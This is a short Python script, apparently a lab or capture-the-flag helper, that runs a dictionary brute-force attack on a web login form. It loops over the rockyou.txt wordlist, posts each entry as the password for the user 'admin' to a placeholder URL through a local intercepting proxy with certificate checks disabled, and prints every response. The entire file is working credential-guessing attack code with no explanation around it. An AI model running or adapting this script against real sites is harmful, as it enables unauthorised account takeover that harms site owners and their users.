import re
import urllib
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

proxy = {
    'https': 'http://127.0.0.1:8080',
    'http': 'http://127.0.0.1:8080'
}

f = open('rock_you.txt')
passwords = f.readlines()
for password in passwords:

    # Encode the pin 
    params = {
        "username" : "admin", 
        "password" : password,
    }
    
    r = requests.post("{website}/", proxies=proxy, data=urllib.parse.urlencode(params), verify=False, headers={
    "Content-Type": "application/x-www-form-urlencoded"
    })

    print(f'Results for password = {password}:\n{r.content}\n', flush=True)